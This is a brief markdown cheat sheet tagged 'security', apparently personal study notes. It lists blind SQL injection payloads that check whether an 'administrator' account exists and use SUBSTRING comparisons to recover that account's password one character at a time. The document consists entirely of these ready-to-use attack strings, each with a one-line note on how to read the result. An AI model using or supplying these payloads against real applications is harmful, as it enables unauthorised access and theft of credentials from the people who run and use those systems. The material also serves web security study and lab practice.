---
tags:
  - security
---
# Existence Checks

```
' AND EXISTS (SELECT user FROM users WHERE username = 'administrator') --
```
# Substring Checks
```
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
- Indicates the first character of the password is greater than the character `m`
```
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
- Indicates the first character of the password is equals the character `s`